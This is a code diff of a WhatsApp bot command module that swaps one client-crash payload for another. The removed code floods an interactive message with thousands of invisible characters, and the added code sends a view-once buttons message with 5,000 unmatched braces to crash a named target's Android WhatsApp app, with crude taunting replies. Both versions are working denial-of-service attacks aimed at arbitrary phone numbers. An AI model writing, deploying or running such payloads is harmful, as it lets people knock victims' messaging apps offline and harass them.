@@ -1,100 +1,108 @@
 const crypto = require('crypto');
+const ownerMiddleware = require('../../utility/botUtil/Ownermiddleware');
 
 module.exports = {
-  name: 'crash',
-  aliases: ['crashbeta', 'killios'],
-  description: 'Sends a payload to crash a WhatsApp client',
+  name: 'Invincible android crash',
+  aliases: ['invi'],
+  description: 'Sends an invisible payload to crash an Android WhatsApp client (Owner only)',
   run: async (context) => {
-    const { client, m, prefix, text, botname } = context;
+    await ownerMiddleware(context, async () => {
+      const { client, m, prefix, text, botname, silencer, Owner } = context;
 
-    try {
-      // Check for target (phone number, quoted user, or mentioned JID)
-      let target = text.split(' ')[0] || m.quoted?.sender || m.mentionedJid?.[0];
-      if (!target) {
-        return client.sendMessage(m.chat, {
-          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, dumbass, give me a target! Use ${prefix}crash <number> or mention someone, moron.\n\nPowered by *${botname}*`
+      try {
+        // Validate context properties
+        if (!client || !m || !prefix || !botname || !silencer || !Owner) {
+          const missing = [!client && 'client', !m && 'm', !prefix && 'prefix', !botname && 'botname', !silencer && 'silencer', !Owner && 'Owner']
+            .filter(Boolean)
+            .join(', ');
+          console.error(`Missing context properties: ${missing}`);
+          return client?.sendMessage(m?.chat, {
+            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Bot’s fucked. Missing: ${missing}. Yell at your dev, dumbass.\n◈━━━━━━━━━━━━━━━━◈`
+          }, { quoted: m }) || Promise.reject(new Error('Invalid context: missing critical properties'));
+        }
+
+        // Validate target (phone number, quoted user, or mentioned JID)
+        let target = text?.split(' ')[0] || m.quoted?.sender || m.mentionedJid?.[0];
+        if (!target) {
+          return client.sendMessage(m.chat, {
+            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, dumbass, give me a target! Use ${prefix}invi <number> or mention someone, moron.\n\nPowered by *${botname}*`
+          }, { quoted: m });
+        }
+
+        // Convert to JID format if needed (e.g., 123456789 → 123456789@s.whatsapp.net)
+        if (!target.includes('@s.whatsapp.net')) {
+          const cleanTarget = target.replace(/[^0-9]/g, '');
+          if (!cleanTarget || cleanTarget.length < 7) {
+            return client.sendMessage(m.chat, {
+              text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Invalid target number, you idiot. Provide a valid phone number.\n\nPowered by *${botname}*`
+            }, { quoted: m });
+          }
+          target = `${cleanTarget}@s.whatsapp.net`;
+        }
+
+        // Validate JID format
+        const jidRegex = /^[0-9]+@s\.whatsapp\.net$/;
+        if (!jidRegex.test(target)) {
+          return client.sendMessage(m.chat, {
+            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Malformed target JID, moron. Check the number and try again.\n\nPowered by *${botname}*`
+          }, { quoted: m });
+        }
+
+        // Android invincible crash function
+        async function androidInvincibleCrash(target) {
+          try {
+            await silencer.relayMessage(target, {
+              viewOnceMessage: {
+                message: {
+                  buttonsMessage: {
+                    text: "hi",
+                    contentText: "null",
+                    buttons: [
+                      {
+                        buttonId: "8178018",
+                        buttonText: {
+                          displayText: "Good morning"
+                        },
+                        type: "NATIVE_FLOW",
+                        nativeFlowInfo: {
+                          name: "cta_url",
+                          paramsJson: `{`.repeat(5000),
+                        },
+                      }
+                    ],
+                    headerType: "TEXT"
+                  }
+                }
+              }
+            }, {});
+            console.log(`[ANDROID INVINCIBLE CRASH] Payload sent to ${target}`);
+          } catch (relayError) {
+            throw new Error(`Failed to relay payload: ${relayError.message}`);
+          }
+        }
+
+        // Execute androidInvincibleCrash
+        await androidInvincibleCrash(target);
+
+        // Send success response
+        const response = `💥 Invisible payload dropped on ${target}! Android's about to crash hard, bitches!\n\nPowered by *${botname}*`;
+        await client.sendMessage(m.chat, {
+          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ ${response}`
         }, { quoted: m });
-      }
-      // Convert to JID format if needed (e.g., 123456789 → 123456789@s.whatsapp.net)
-      if (!target.includes('@s.whatsapp.net')) {
-        target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
-      }
 
-      // Overload function
-      async function Overload(target) {
-        const junk = "ឿ".repeat(5000); // Invisible characters
-
-        const payload = {
-          viewOnceMessage: {
-            message: {
-              interactiveMessage: {
-                body: { text: junk + "XP - STORM🩸" + junk },
-                footer: { buttonParamsJson: junk },
-                header: {
-                  subtitle: junk,
-                  buttonParamsJson: junk,
-                  hasMediaAttachment: false,
-                },
-                contextInfo: {
-                  isForwarded: true,
-                  forwardingScore: 999999,
-                  mentionedJid: [target],
-                  quotedMessage: {
-                    buttonsMessage: {
-                      contentText: junk,
-                      footerText: junk,
-                      buttons: Array(5).fill({
-                        buttonId: junk,
-                        buttonText: { displayText: junk },
-                        type: 1,
-                      }),
-                      headerType: 1,
-                    },
-                  },
-                  conversionSource: "🔥",
-                  conversionData: crypto.randomBytes(16),
-                  utm: {
-                    utmSource: junk,
-                    utmCampaign: junk,
-                  },
-                },
-              },
-            },
-          },
-        };
-
-        // Create message with payload
-        const msg = context.generateWAMessageFromContent(target, context.proto.Message.fromObject(payload), { userJid: target });
-
-        // Send message
-        await client.relayMessage(target, msg.message, {
-          messageId: msg.key.id,
+      } catch (error) {
+        console.error(`[ANDROID INVINCIBLE CRASH ERROR] Failed for ${m?.sender}: ${error.stack || error.message}`);
+        await client?.sendMessage(m?.chat, {
+          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the invisible payload: ${error.message}. Try again, you slacker.\n\nPowered by *${botname}*`
+        }, { quoted: m }).catch((sendError) => {
+          console.error(`[SEND ERROR] Failed to send error message: ${sendError.stack || sendError.message}`);
         });
-        console.log(`[IMMEDIATE FC] Sent to ${target}`);
       }
-
-      // Execute Overload
-      await Overload(target);
-
-      // Tailored response based on command
-      const command = m.text.toLowerCase().split(' ')[0];
-      let response;
-      if (command === '.crash') {
-        response = `💥 Payload dropped on ${target}! Shit’s about to hit the fan, bitches!\n\nPowered by *${botname}*`;
-      } else if (command === '.crashbeta') {
-        response = `🧪 Beta payload blasted to ${target}! Testing some next-level chaos!\n\nPowered by *${botname}*`;
-      } else if (command === '.killios') {
-        response = `🍎 iOS smoked at ${target}! Say goodbye to that apple, fucker!\n\nPowered by *${botname}*`;
-      }
-
-      // Send response
-      await client.sendMessage(m.chat, { text: `◈━━━━━━━━━━━━━━━━◈\n│❒ ${response}` }, { quoted: m });
-
-    } catch (error) {
-      console.error('Error sending crash payload:', error);
-      await client.sendMessage(m.chat, {
-        text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the crash payload. Try again, you slacker.\n\nPowered by *${botname}*`
-      }, { quoted: m });
-    }
+    }).catch((middlewareError) => {
+      console.error(`[MIDDLEWARE ERROR] Owner validation failed: ${middlewareError.stack || middlewareError.message}`);
+      return context.client?.sendMessage(context.m?.chat, {
+        text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Nice try, loser. Only the owner can run this shit.\n◈━━━━━━━━━━━━━━━━◈`
+      }, { quoted: context.m });
+    });
   },
 };
